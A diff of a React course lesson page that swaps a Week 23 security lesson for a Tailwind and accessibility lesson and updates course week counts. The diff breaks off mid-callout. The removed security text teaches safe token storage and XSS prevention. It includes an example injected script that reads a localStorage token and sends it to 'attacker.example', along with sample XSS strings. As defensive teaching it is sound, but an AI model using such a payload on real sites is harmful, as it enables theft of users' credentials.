@@ -14,8 +14,8 @@
 </script>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Week 23: Security, Authentication &amp; Authorization — CodeVerse Creatives</title>
-<meta name="description" content="Week 23 of the React curriculum: session vs. JWT vs. OAuth/OIDC auth flows, token storage tradeoffs, protected routes with role-based access control, and preventing XSS/CSRF in React apps." />
+<title>Week 23: Styling Systems &amp; Accessibility — CodeVerse Creatives</title>
+<meta name="description" content="Week 23 of the React curriculum: Tailwind CSS and component-scoped styling approaches, semantic HTML, ARIA, keyboard navigation, and auditing with axe and Lighthouse." />
 <link rel="icon" href="../../assets/favicons/favicon.svg" type="image/svg+xml" />
 <link rel="icon" href="../../assets/favicons/favicon.ico" sizes="any" />
 <link rel="icon" href="../../assets/favicons/favicon-32x32.png" sizes="32x32" type="image/png" />
@@ -63,7 +63,7 @@
             <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="2.5"/><ellipse cx="12" cy="12" rx="10" ry="4.2"/><ellipse cx="12" cy="12" rx="10" ry="4.2" transform="rotate(60 12 12)"/><ellipse cx="12" cy="12" rx="10" ry="4.2" transform="rotate(120 12 12)"/></svg></span>
             <span class="nav-course-card__text">
               <span class="nav-course-card__title">React</span>
-              <span class="nav-course-card__meta">26 Weeks</span>
+              <span class="nav-course-card__meta">28 Weeks</span>
             </span>
           </a>
           <a href="../llm-ml/index.html" class="nav-course-card c-llm-ml">
@@ -77,21 +77,21 @@
             <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="6" rx="1"/><rect x="2" y="15" width="20" height="6" rx="1"/><path d="M6 6h.01M6 18h.01"/></svg></span>
             <span class="nav-course-card__text">
               <span class="nav-course-card__title">Spring Boot</span>
-              <span class="nav-course-card__meta">15 Weeks</span>
+              <span class="nav-course-card__meta">26 Weeks</span>
             </span>
           </a>
           <a href="../devops-cloud/index.html" class="nav-course-card c-devops-cloud">
             <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.5 19H9a5 5 0 1 1 .87-9.92A6 6 0 0 1 21 11a4 4 0 0 1-.5 8Z"/></svg></span>
             <span class="nav-course-card__text">
               <span class="nav-course-card__title">DevOps &amp; Cloud</span>
-              <span class="nav-course-card__meta">15 Weeks</span>
+              <span class="nav-course-card__meta">26 Weeks</span>
             </span>
           </a>
           <a href="../python/index.html" class="nav-course-card c-python">
             <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2c-2 0-4 .5-4 2v3h4v1H6c-1.5 0-3 1-3 4s1.5 4 3 4h2v-2.5c0-1.5 1-2.5 2.5-2.5h4c1 0 2-1 2-2V4c0-1.5-2-2-4.5-2Z"/><path d="M12 22c2 0 4-.5 4-2v-3h-4v-1h6c1.5 0 3-1 3-4s-1.5-4-3-4h-2v2.5c0 1.5-1 2.5-2.5 2.5h-4c-1 0-2 1-2 2v4c0 1.5 2 2 4.5 2Z"/></svg></span>
             <span class="nav-course-card__text">
               <span class="nav-course-card__title">Python</span>
-              <span class="nav-course-card__meta">15 Weeks</span>
+              <span class="nav-course-card__meta">26 Weeks</span>
             </span>
           </a>
           <a href="../dsa-cpp/index.html" class="nav-course-card c-dsa-cpp">
@@ -105,14 +105,14 @@
             <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg></span>
             <span class="nav-course-card__text">
               <span class="nav-course-card__title">System Design</span>
-              <span class="nav-course-card__meta">15 Weeks</span>
+              <span class="nav-course-card__meta">28 Weeks</span>
             </span>
           </a>
           <a href="../node-express/index.html" class="nav-course-card c-node-express">
             <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 21 6.5 21 15.5 12 20 3 15.5 3 6.5 12 2"/><path d="M9 9.5c1.5-1 3.5-1 5 0M8 13c2 1.5 6 1.5 8 0"/></svg></span>
             <span class="nav-course-card__text">
               <span class="nav-course-card__title">Node.js &amp; Express</span>
-              <span class="nav-course-card__meta">15 Weeks</span>
+              <span class="nav-course-card__meta">26 Weeks</span>
             </span>
           </a>
           <a href="../servicenow/index.html" class="nav-course-card c-servicenow">
@@ -120,6 +120,13 @@
             <span class="nav-course-card__text">
               <span class="nav-course-card__title">ServiceNow</span>
               <span class="nav-course-card__meta">26 Weeks</span>
+            </span>
+          </a>
+          <a href="../aptitude/index.html" class="nav-course-card c-aptitude">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="3" width="16" height="18" rx="2"/><line x1="8" y1="7" x2="16" y2="7"/><line x1="8" y1="12" x2="8" y2="12"/><line x1="12" y1="12" x2="12" y2="12"/><line x1="16" y1="12" x2="16" y2="12"/><line x1="8" y1="16" x2="8" y2="16"/><line x1="12" y1="16" x2="12" y2="16"/><line x1="16" y1="16" x2="16" y2="16"/><line x1="8" y1="20" x2="8" y2="20"/><line x1="12" y1="20" x2="12" y2="20"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Numerical Aptitude</span>
+              <span class="nav-course-card__meta">20 Weeks</span>
             </span>
           </a>
         </div>
@@ -145,23 +152,22 @@
       <div class="lesson-crumb">
         <a href="../react/index.html">React Syllabus</a>
         <span>/</span>
-        <a href="../react/index.html#timeline">Module 15 · Security &amp; Authentication</a>
+        <a href="../react/index.html#timeline">Module 13 · Styling &amp; Accessibility</a>
         <span>/</span>
         <span aria-current="page">Week 23</span>
       </div>
 
-      <h1>Week 23: Security, Authentication &amp; Authorization</h1>
+      <h1>Week 23: Styling Systems &amp; Accessibility</h1>
       <p class="lesson-header__lede">
-        Week 7's protected routes assumed the hard part was already solved — an <code>isLoggedIn</code>
-        flag just existed, and <code>RequireAuth</code> read it. This week builds the real thing
-        underneath that flag: how a browser and a server actually agree that a user is who they say
-        they are, where it's safe to keep the proof of that agreement, and how to stop a React app
-        from being trivially exploitable by the two attacks that target it most: XSS and CSRF.
+        Week 5 touched accessibility for one form. This week generalizes it into a habit that
+        applies to everything you build — semantic HTML, keyboard support, and ARIA used correctly
+        — alongside Tailwind CSS, the utility-first styling approach used throughout the rest of
+        the course's examples from here on.
       </p>
 
       <div class="lesson-meta">
-        <span class="chip chip--accent">Module 15 of 17</span>
-        <span class="chip">Week 23 of 26</span>
+        <span class="chip chip--accent">Module 13 of 17</span>
+        <span class="chip">Week 23 of 28</span>
         <span class="chip">~3–4 Hours</span>
         <span class="chip">Hands-on Exercise Included</span>
       </div>
@@ -169,18 +175,18 @@
       <div class="obj-recap reveal">
         <h2>By the end of this week, you'll be able to</h2>
         <ul>
-          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Explain the tradeoffs between session-cookie, JWT, and OAuth/OIDC auth flows and pick the right one for a given app</li>
-          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Store auth tokens securely, and explain why <code>localStorage</code> is usually the wrong answer</li>
-          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Protect routes with role-based access control and prevent the most common React-specific XSS/CSRF mistakes</li>
+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Style components productively with Tailwind's utility classes</li>
+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Build a fully keyboard-operable custom interactive component</li>
+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Run and act on an automated accessibility audit</li>
         </ul>
       </div>
 
       <div class="phase-nav">
-        <a href="#auth-flows"><span>1</span> Auth Flows: Session vs. JWT vs. OAuth/OIDC</a>
-        <a href="#token-storage"><span>2</span> Token Storage Tradeoffs</a>
-        <a href="#protected-routes-rbac"><span>3</span> Protected Routes &amp; RBAC</a>
-        <a href="#xss-prevention"><span>4</span> XSS Prevention &amp; Sanitizing Content</a>
-        <a href="#csrf-secure-api"><span>5</span> CSRF &amp; Secure API Calls</a>
+        <a href="#tailwind"><span>1</span> Tailwind CSS</a>
+        <a href="#scoped-styling"><span>2</span> Component-Scoped Alternatives</a>
+        <a href="#semantic-html"><span>3</span> Semantic HTML First</a>
+        <a href="#aria-keyboard"><span>4</span> ARIA &amp; Keyboard Navigation</a>
+        <a href="#auditing"><span>5</span> Auditing with axe &amp; Lighthouse</a>
         <a href="#exercise"><span>6</span> Exercise</a>
         <a href="#quiz"><span>7</span> Knowledge Check</a>
       </div>
@@ -193,425 +199,223 @@
       <div class="lesson-layout">
         <article class="lesson-article">
 
-          <section id="auth-flows">
-            <h2>1. Auth Flows: Session vs. JWT vs. OAuth/OIDC</h2>
+          <section id="tailwind">
+            <h2>1. Tailwind CSS</h2>
             <p>
-              "Authentication" isn't one thing — it's a family of different mechanisms for the same
-              underlying handshake: prove who you are once, then get treated as that identity on
-              every request afterward without re-proving it each time. Three flows cover the vast
-              majority of real apps, and each makes a different tradeoff.
+              Tailwind is a utility-first CSS framework: instead of writing custom class names and
+              separate CSS files, you compose a component's styling directly in its markup from a
+              large set of small, single-purpose classes.
             </p>
 
-            <ul>
-              <li><strong>Server session + cookie</strong> — the server generates a random session ID on login, stores the session's data (user ID, roles) in its own store (Redis, a database table), and sends the browser only the ID, in a cookie. Every request, the browser automatically attaches that cookie, and the server looks the session up. Simple to reason about, and revoking access is instant — delete the row. The cost: the server has to keep state for every logged-in user, which complicates scaling across multiple server instances unless the session store is shared.</li>
-              <li><strong>JWT (JSON Web Token)</strong> — the server signs a token containing the user's identity and claims directly, and hands the whole token to the client. Any server holding the same signing secret can verify it without a database lookup — genuinely <strong>stateless</strong>, which scales trivially across instances. The cost: a JWT is valid until it expires, full stop. There's no "delete the row" — revoking a single compromised token before its expiry requires extra machinery (a denylist, short expiries plus refresh tokens) that reintroduces some of the state you were trying to avoid.</li>
-              <li><strong>OAuth 2.0 / OpenID Connect (OIDC)</strong> — you don't verify credentials at all. The user authenticates with a third party (Google, GitHub, Auth0, Okta), and that party hands your app a token vouching for who the user is (OIDC layers "identity" on top of OAuth's "authorization"). Right for when you don't want to own passwords, want a faster signup flow, or need to act on a user's behalf against a third-party API (reading their Google Calendar, for instance).</li>
-            </ul>
-
             <div class="code-block">
-              <div class="code-block__label">example — session login response (server sets the cookie)</div>
-              <pre><code>POST /api/login
-Set-Cookie: session_id=8f3e...c1a; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=604800
-
-{ "user": { "id": 42, "name": "Priya" } } // no token in the JSON body at all
+              <div class="code-block__label">terminal (Next.js includes this by default via create-next-app)</div>
+              <pre><code>npm install -D tailwindcss @tailwindcss/postcss postcss
 </code></pre>
             </div>
 
             <div class="code-block">
-              <div class="code-block__label">example — decoded JWT payload (never store secrets here — it's readable, not encrypted)</div>
-              <pre><code>{
-  "sub": "42",
-  "name": "Priya",
-  "role": "editor",
-  "iat": 1735689600, // issued at
-  "exp": 1735693200  // expires 1 hour later
+              <div class="code-block__label">ProductCard.tsx</div>
+              <pre><code>function ProductCard({ product }: { product: Product }) {
+  return (
+    &lt;div className="rounded-lg border border-gray-200 p-4 shadow-sm hover:shadow-md transition-shadow"&gt;
+      &lt;h3 className="text-lg font-semibold text-gray-900"&gt;{product.name}&lt;/h3&gt;
+      &lt;p className="mt-1 text-sm text-gray-500"&gt;${product.price}&lt;/p&gt;
+      &lt;button className="mt-3 w-full rounded-md bg-blue-600 px-4 py-2 text-white hover:bg-blue-700"&gt;
+        Add to cart
+      &lt;/button&gt;
+    &lt;/div&gt;
+  );
 }
 </code></pre>
             </div>
 
             <p>
-              That last point about JWTs is easy to miss: a JWT's payload is <strong>base64-encoded,
-              not encrypted</strong>. Anyone holding the token — including the user themselves,
-              via their browser dev tools — can read every claim inside it. The signature only
-              proves the server issued it unmodified; it proves nothing about secrecy.
+              The appeal: no context-switching between a component file and a separate CSS file,
+              no naming struggles ("what do I call this wrapper div?"), and styles that can never
+              leak — a utility class does exactly one thing, everywhere it's used. The tradeoff:
+              markup gets visually dense, and consistency across a codebase depends on discipline
+              (or a shared config) rather than being structurally enforced.
+            </p>
+          </section>
+
+          <section id="scoped-styling">
+            <h2>2. Component-Scoped Alternatives</h2>
+            <p>
+              Tailwind isn't the only reasonable choice — two other approaches solve the same
+              underlying problem (styles that don't leak or collide) differently, and you'll
+              encounter both in real codebases.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">CSS Modules — ProductCard.module.css</div>
+              <pre><code>.card {
+  border-radius: 0.5rem;
+  border: 1px solid #e5e7eb;
+  padding: 1rem;
+}
+
+.title {
+  font-size: 1.125rem;
+  font-weight: 600;
+}
+</code></pre>
+            </div>
+
+            <div class="code-block">
+              <div class="code-block__label">ProductCard.tsx — using the module</div>
+              <pre><code>import styles from './ProductCard.module.css';
+
+function ProductCard({ product }: { product: Product }) {
+  return (
+    &lt;div className={styles.card}&gt;
+      &lt;h3 className={styles.title}&gt;{product.name}&lt;/h3&gt;
+    &lt;/div&gt;
+  );
+}
+</code></pre>
+            </div>
+
+            <p>
+              CSS Modules give you real, separate CSS files (familiar if you know plain CSS) while
+              the build tool automatically generates unique class names per component, preventing
+              the global-namespace collisions that plain CSS files are prone to. Styled-components
+              and similar CSS-in-JS libraries take a third approach: writing actual CSS inside a
+              JavaScript template literal, scoped to a generated component. All three are valid;
+              this course uses Tailwind for its examples going forward because it needs no separate
+              files to follow along with, but the underlying component and accessibility
+              principles in this lesson apply identically regardless of which you pick.
+            </p>
+          </section>
+
+          <section id="semantic-html">
+            <h2>3. Semantic HTML First</h2>
+            <p>
+              The single highest-leverage accessibility decision is also the cheapest: use the
+              HTML element that actually matches what something <em>is</em>, before reaching for
+              ARIA to patch a generic <code>&lt;div&gt;</code> into behaving like it.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">the expensive way</div>
+              <pre><code>&lt;div onClick={handleClick} className="button-looking-thing"&gt;
+  Submit
+&lt;/div&gt;
+{/* Gets you: no keyboard focus, no Enter/Space activation, no screen reader
+    announcement as a button -- all of which you'd now need to hand-build. */}
+</code></pre>
+            </div>
+
+            <div class="code-block">
+              <div class="code-block__label">the free way</div>
+              <pre><code>&lt;button onClick={handleClick} className="button-looking-thing"&gt;
+  Submit
+&lt;/button&gt;
+{/* Keyboard-focusable, Enter/Space activates it, announced correctly by
+    every screen reader -- all built into the browser, for free. */}
+</code></pre>
+            </div>
+
+            <p>
+              This applies broadly: <code>&lt;nav&gt;</code> for navigation, <code>&lt;main&gt;</code>
+              for a page's primary content, <code>&lt;label&gt;</code> for form labels (Week 5),
+              a real <code>&lt;button&gt;</code> for anything clickable that performs an action, a
+              real <code>&lt;a href&gt;</code> for anything that navigates. Every one of these comes
+              with keyboard behavior and screen-reader semantics built in — ARIA (Section 4) exists
+              to fill genuine gaps for custom widgets, not to replace what semantic HTML already
+              provides for free.
+            </p>
+          </section>
+
+          <section id="aria-keyboard">
+            <h2>4. ARIA &amp; Keyboard Navigation for Custom Widgets</h2>
+            <p>
+              Some UI genuinely has no native HTML equivalent — Week 12's <code>Tabs</code> compound
+              component is exactly this case. For those, ARIA roles/states plus real keyboard
+              handling are required, not optional polish.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">Week 12's Tabs.Tab, made keyboard-accessible</div>
+              <pre><code>function Tab({ id, children }: { id: string; children: ReactNode }) {
+  const { activeTab, setActiveTab } = useTabsContext();
+
+  return (
+    &lt;button
+      role="tab"
+      aria-selected={activeTab === id}
+      tabIndex={activeTab === id ? 0 : -1} // only the active tab is in the normal tab order
+      onClick={() =&gt; setActiveTab(id)}
+      onKeyDown={(e) =&gt; {
+        if (e.key === 'ArrowRight') focusNextTab();  // arrow keys move focus between tabs
+        if (e.key === 'ArrowLeft') focusPreviousTab();
+      }}
+    &gt;
+      {children}
+    &lt;/button&gt;
+  );
+}
+</code></pre>
+            </div>
+
+            <p>
+              This follows the WAI-ARIA Authoring Practices' documented pattern for tabs: arrow
+              keys move focus between tab buttons, only the active tab sits in the normal Tab-key
+              order (<code>tabIndex={'{0}'}</code> vs. <code>{'{-1}'}</code>), and
+              <code>aria-selected</code> announces which tab is active to a screen reader. Building
+              a correct custom widget means implementing the same interaction contract a user would
+              already expect from a native equivalent, where one exists — ARIA Authoring Practices
+              is the reference for exactly what that contract should be for a given pattern.
             </p>
 
             <div class="callout callout--tip">
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
               <div>
-                <strong>Picking one</strong>
-                <p>Single backend, want instant revocation and simplicity: server sessions. Multiple independently-scaled services that all need to verify identity without a shared session store: JWT. Don't want to own credential storage, or need delegated access to a third-party API: OAuth/OIDC. Plenty of real apps combine two — OIDC for login, then a short-lived session cookie for everything after.</p>
+                <strong>The "first rule of ARIA"</strong>
+                <p>Adding an ARIA role to an element doesn't grant it any of that role's expected behavior automatically — <code>role="tab"</code> on a <code>&lt;div&gt;</code> announces it as a tab but does nothing about keyboard focus or activation on its own; you still have to implement that. This is why Section 3's "use the right native element first" holds: a real <code>&lt;button&gt;</code> gets its behavior for free, an ARIA role never does.</p>
               </div>
             </div>
           </section>
 
-          <section id="token-storage">
-            <h2>2. Token Storage Tradeoffs</h2>
+          <section id="auditing">
+            <h2>5. Auditing with axe &amp; Lighthouse</h2>
             <p>
-              Choosing an auth flow answers "how do we prove identity." A separate, equally
-              important question: once you have a token or session ID, <strong>where does it live
-              in the browser</strong>? Get this wrong and the flow you chose in Section 1 stops
-              mattering.
-            </p>
-
-            <p>
-              <code>localStorage</code> is the option that looks convenient and is usually the wrong
-              answer. It's plain JavaScript-readable storage — which means <strong>any script running
-              on your page can read it</strong>, including a script that shouldn't be there at all.
-              If your app has even one XSS vulnerability (Section 4) — a single unsanitized
-              <code>dangerouslySetInnerHTML</code>, a compromised third-party npm package, an ad
-              script — an attacker's injected code can do <code>localStorage.getItem('token')</code>
-              and exfiltrate it to their own server in one line. No cookie theft, no network
-              interception required; the token was sitting in a place JavaScript was always allowed
-              to read.
+              Automated tools can't catch everything (they can't judge whether alt text is
+              genuinely descriptive, or whether a keyboard flow feels sensible), but they reliably
+              catch a large class of concrete, fixable issues: missing labels, insufficient color
+              contrast, missing alt text, invalid ARIA usage.
             </p>
 
             <div class="code-block">
-              <div class="code-block__label">what an XSS payload can do if the token lives in localStorage</div>
-              <pre><code>// injected via any unsanitized render path -- see Section 4
-const stolen = localStorage.getItem('authToken');
-fetch('https://attacker.example/collect?t=' + stolen); // token is now theirs
-</code></pre>
-            </div>
-
-            <p>
-              An <code>httpOnly</code> cookie closes exactly this hole: it's marked so that
-              <strong>JavaScript cannot read it at all</strong> — not <code>document.cookie</code>,
-              not any library, nothing running on the page. The browser still attaches it to requests
-              automatically, so the server can still authenticate the user; client-side code simply
-              never touches the credential. The tradeoff is that a cookie-based session opens the
-              door to a different attack, CSRF, covered in Section 5 — httpOnly cookies aren't a free
-              upgrade, they trade one risk for a different, more containable one.
-            </p>
-
-            <div class="code-block">
-              <div class="code-block__label">server — login endpoint sets an httpOnly cookie, never returns a token in the body (Express)</div>
-              <pre><code>app.post('/api/login', async (req, res) =&gt; {
-  const { email, password } = req.body;
-  const user = await verifyCredentials(email, password);
-  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
-
-  const token = signToken({ sub: user.id, role: user.role }); // JWT, but never sent to JS
-
-  res.cookie('authToken', token, {
-    httpOnly: true,               // invisible to document.cookie / any JS
-    secure: true,                 // only sent over HTTPS
-    sameSite: 'lax',              // mitigates CSRF -- see Section 5
-    maxAge: 60 * 60 * 1000,       // 1 hour
-  });
-
-  res.json({ user: { id: user.id, name: user.name } }); // no token here
-});
+              <div class="code-block__label">terminal — axe in a test suite</div>
+              <pre><code>npm install -D @axe-core/react
 </code></pre>
             </div>
 
             <div class="code-block">
-              <div class="code-block__label">client — no token ever touches JS; the browser attaches the cookie automatically</div>
-              <pre><code>async function login(email: string, password: string) {
-  const res = await fetch('/api/login', {
-    method: 'POST',
-    credentials: 'include', // send/receive cookies on this cross-origin-capable request
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ email, password }),
-  });
-  return res.json(); // { user: { id, name } } -- that's all the client ever sees
-}
+              <div class="code-block__label">ProductCard.a11y.test.tsx</div>
+              <pre><code>import { render } from '@testing-library/react';
+import { axe, toHaveNoViolations } from 'jest-axe';
+import { expect } from 'vitest';
+import ProductCard from './ProductCard';
 
-// every later authenticated request just needs credentials: 'include' --
-// no Authorization header to manage, no token to remember to attach
-async function getProfile() {
-  const res = await fetch('/api/profile', { credentials: 'include' });
-  return res.json();
-}
-</code></pre>
-            </div>
+expect.extend(toHaveNoViolations);
 
-            <div class="callout callout--tip">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
-              <div>
-                <strong>What about a plain in-memory variable?</strong>
-                <p>Keeping a token in a React state variable (not <code>localStorage</code>) is still readable by any injected script <em>while that script runs</em>, but at least doesn't persist it for an attacker to grab later or across tabs. It's a real improvement over <code>localStorage</code>, but an httpOnly cookie remains the stronger default whenever your frontend and API share a domain (or a configured cross-subdomain cookie) — it removes the token from JS's reach entirely, not just from persistent storage.</p>
-              </div>
-            </div>
-          </section>
-
-          <section id="protected-routes-rbac">
-            <h2>3. Protected Routes &amp; Role-Based Access Control</h2>
-            <p>
-              Week 7's <code>RequireAuth</code> answered one question — is anyone logged in? Most
-              real apps need a second, sharper question: is <em>this</em> logged-in user allowed to
-              see <em>this</em> page? An admin dashboard shouldn't render for a user whose role is
-              <code>"viewer"</code>, even though they're fully authenticated.
-            </p>
-
-            <div class="code-block">
-              <div class="code-block__label">RequireRole.tsx — extends Week 7's RequireAuth with a role check</div>
-              <pre><code>import { Navigate, Outlet, useLocation } from 'react-router';
-import { useAuth } from './useAuth';
-
-type Role = 'viewer' | 'editor' | 'admin';
-
-function RequireRole({ role }: { role: Role }) {
-  const { user } = useAuth();
-  const location = useLocation();
-
-  if (!user) {
-    // not logged in at all -- same redirect Week 7 used
-    return &lt;Navigate to="/login" state={{ from: location }} replace /&gt;;
-  }
-
-  if (user.role !== role) {
-    // logged in, but the wrong role -- a different destination than "please log in"
-    return &lt;Navigate to="/forbidden" replace /&gt;;
-  }
-
-  return &lt;Outlet /&gt;;
-}
-</code></pre>
-            </div>
-
-            <div class="code-block">
-              <div class="code-block__label">route config -- wrapping only the admin subtree</div>
-              <pre><code>const router = createBrowserRouter([
-  { path: '/login', element: &lt;LoginPage /&gt; },
-  { path: '/forbidden', element: &lt;ForbiddenPage /&gt; },
-  {
-    element: &lt;RequireAuth /&gt;, // Week 7 -- must be logged in at all
-    children: [
-      { path: '/dashboard', element: &lt;DashboardPage /&gt; },
-      {
-        element: &lt;RequireRole role="admin" /&gt;, // additionally, must be an admin
-        children: [
-          { path: '/admin', element: &lt;AdminPage /&gt; },
-          { path: '/admin/users', element: &lt;AdminUsersPage /&gt; },
-        ],
-      },
-    ],
-  },
-]);
-</code></pre>
-            </div>
-
-            <p>
-              Stacking wrapper routes like this composes cleanly: <code>/admin</code> is nested
-              inside both <code>RequireAuth</code> and <code>RequireRole</code>, so an unauthenticated
-              visitor bounces to <code>/login</code> and an authenticated non-admin bounces to
-              <code>/forbidden</code> — two different, correct outcomes from one route tree.
-            </p>
-
-            <p>
-              The same check belongs in a <strong>loader</strong> (Week 7) too, not only a wrapper
-              component — useful when the redirect decision should happen before any of the route's
-              elements render at all, particularly for a route with its own data-fetching loader:
-            </p>
-
-            <div class="code-block">
-              <div class="code-block__label">requireRole.ts -- a loader-level guard</div>
-              <pre><code>import { redirect } from 'react-router';
-import { getCurrentUser } from './auth';
-
-function requireRole(role: 'viewer' | 'editor' | 'admin') {
-  return async () =&gt; {
-    const user = await getCurrentUser(); // reads the session, e.g. via /api/me
-    if (!user) throw redirect('/login');
-    if (user.role !== role) throw redirect('/forbidden');
-    return user;
-  };
-}
-
-// route config
-{
-  path: '/admin/users',
-  element: &lt;AdminUsersPage /&gt;,
-  loader: requireRole('admin'),
-}
-</code></pre>
-            </div>
-
-            <div class="callout callout--tip">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
-              <div>
-                <strong>Still not a security boundary</strong>
-                <p>Exactly like Week 7's warning: <code>RequireRole</code> and <code>requireRole</code> loaders control what renders in the browser, nothing more. The <code>/api/admin/users</code> endpoint itself must independently check the caller's role on the server, every request — a client-side check is convenience for legitimate users, not a wall against anyone willing to call the API directly.</p>
-              </div>
-            </div>
-          </section>
-
-          <section id="xss-prevention">
-            <h2>4. XSS Prevention &amp; Sanitizing User Content</h2>
-            <p>
-              Cross-site scripting (XSS) is an attacker getting their own JavaScript to run inside
-              your page, in your users' browsers, under your origin — which is exactly what makes
-              Section 2's <code>localStorage</code> token theft possible, and much worse besides.
-              React's default behavior already closes the most common door: when you render
-              <code>{'{someString}'}</code> in JSX, React escapes it as text, not HTML. A comment
-              containing <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> renders as the literal
-              visible text of that string, not as an executed script tag.
-            </p>
-
-            <div class="code-block">
-              <div class="code-block__label">safe by default -- JSX escapes this automatically</div>
-              <pre><code>function Comment({ text }: { text: string }) {
-  return &lt;p&gt;{text}&lt;/p&gt;; // even if text is "&lt;img src=x onerror=alert(1)&gt;", it renders as inert text
-}
-</code></pre>
-            </div>
-
-            <p>
-              The risk reappears the moment you opt out of that default with
-              <code>dangerouslySetInnerHTML</code> — a prop that's honestly named: it hands React a
-              raw HTML string and tells it to inject that HTML directly into the DOM, script tags,
-              event handlers and all, with zero escaping. It exists because some content is
-              legitimately meant to be rendered <em>as</em> HTML — a rich-text editor's output, a
-              CMS field, a Markdown-to-HTML conversion — not because it's ever safe to point directly
-              at unvalidated user input.
-            </p>
-
-            <div class="code-block">
-              <div class="code-block__label">the unsafe version -- never do this with user-supplied content</div>
-              <pre><code>function Comment({ html }: { html: string }) {
-  // html came from another user's input. This executes anything they put in it.
-  return &lt;div dangerouslySetInnerHTML={{ __html: html }} /&gt;;
-}
-</code></pre>
-            </div>
-
-            <p>
-              The fix isn't to avoid rich HTML content — it's to <strong>sanitize</strong> it first,
-              stripping anything that isn't safe to render (script tags, <code>onerror</code>/<code>onclick</code>
-              handlers, <code>javascript:</code> URLs) while keeping legitimate formatting tags
-              (<code>&lt;b&gt;</code>, <code>&lt;a&gt;</code>, <code>&lt;p&gt;</code>) intact.
-              <a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noreferrer">DOMPurify</a>
-              is the standard tool for this:
-            </p>
-
-            <div class="code-block">
-              <div class="code-block__label">terminal</div>
-              <pre><code>npm install dompurify
-npm install -D @types/dompurify
-</code></pre>
-            </div>
-
-            <div class="code-block">
-              <div class="code-block__label">SafeComment.tsx -- sanitize before rendering, every time</div>
-              <pre><code>import DOMPurify from 'dompurify';
-
-function SafeComment({ html }: { html: string }) {
-  const clean = DOMPurify.sanitize(html, {
-    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
-    ALLOWED_ATTR: ['href', 'target', 'rel'],
-  });
-
-  return &lt;div dangerouslySetInnerHTML={{ __html: clean }} /&gt;;
-}
-
-// &lt;SafeComment html="Nice work! &lt;script&gt;stealCookies()&lt;/script&gt;" /&gt;
-// renders: "Nice work! " -- the script tag is stripped entirely, nothing executes
-</code></pre>
-            </div>
-
-            <div class="callout callout--tip">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
-              <div>
-                <strong>The actual rule</strong>
